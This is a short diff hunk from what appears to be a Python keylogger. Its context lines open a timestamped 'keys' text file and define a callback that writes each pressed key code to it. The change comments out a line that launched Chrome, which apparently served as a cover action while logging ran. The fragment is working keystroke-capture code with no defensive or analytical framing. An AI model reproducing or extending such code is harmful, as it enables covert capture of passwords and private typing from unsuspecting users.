@@ -6,7 +6,7 @@ now = datetime.datetime.now()
 nam = now.strftime("%d-%m-%Y-%H-%M")
 name = str("files/keys-")+str(nam)+".txt"
 file=open(name, 'a+')
-os.system('"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"')
+#os.system('"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"')
 def print_pressed_keys(e):
         for code in keyboard._pressed_events:
                 file.write(str(code)+"\n")
